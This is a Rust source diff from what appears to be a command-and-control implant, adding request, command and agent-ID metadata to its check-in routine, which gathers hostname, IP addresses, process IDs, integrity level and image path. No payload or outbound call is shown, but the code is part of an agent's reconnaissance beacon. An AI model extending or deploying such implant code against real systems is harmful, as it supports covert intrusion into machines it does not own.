@@ -12,7 +12,10 @@ use mod_win32::{
     },
     nt_ps_api::{get_pid_and_ppid, get_process_integrity},
 };
-use rs2_communication_protocol::communication_structs::checkin::{Checkin, PartialCheckin};
+use rs2_communication_protocol::{
+    communication_structs::checkin::{Checkin, PartialCheckin},
+    metadata::Metadata,
+};
 
 use crate::setup::system_data::checkin_from_raw;
 
@@ -69,7 +72,7 @@ pub fn command_exit(exit_type: i32) {
 /// This function uses several `unsafe` blocks to interact with system-level APIs and perform raw pointer dereferencing.
 /// The caller must ensure that the system and memory are in a valid state before calling this function.
 ///
-pub fn command_checkin() -> Result<String, serde_json::Error> {
+pub fn command_checkin(metadata: Metadata) -> Result<String, serde_json::Error> {
     // Get the computer name in DNS Hostname format.
     let mut buffer = Vec::new();
     let mut size: u32 = 0;
@@ -124,7 +127,7 @@ pub fn command_checkin() -> Result<String, serde_json::Error> {
 
     let first_ip = ip_addresses.unwrap().get(0).unwrap().1.clone();
     // Create a `Checkin` object with the gathered metadata.
-    let checkin = unsafe {
+    let mut checkin = unsafe {
         Box::new(Checkin::new(PartialCheckin {
             operative_system: operating_system, // OS details.
             hostname: hostname,                 // Computer hostname.
@@ -138,6 +141,8 @@ pub fn command_checkin() -> Result<String, serde_json::Error> {
             cwd: get_image_path_name(),         // Current working directory.
         }))
     };
+
+    checkin.with_metadata(metadata);
 
     // Set the `Checkin` data in the global instance for further access.
     unsafe { instance_mut().set_checkin_data(Box::into_raw(checkin) as *mut c_void) };
@@ -153,8 +158,15 @@ mod tests {
 
     #[test]
     fn test_checkin() {
+        let metadata = Metadata {
+            request_id: format!("req-{}", 1),
+            command_id: format!("cmd-{}", 1),
+            agent_id: "agent-1234".to_string(),
+            path: None,
+        };
+
         // Test gathering system information and metadata for check-in
-        let result = command_checkin();
+        let result = command_checkin(metadata);
 
         // Ensure the result is successful
         assert!(
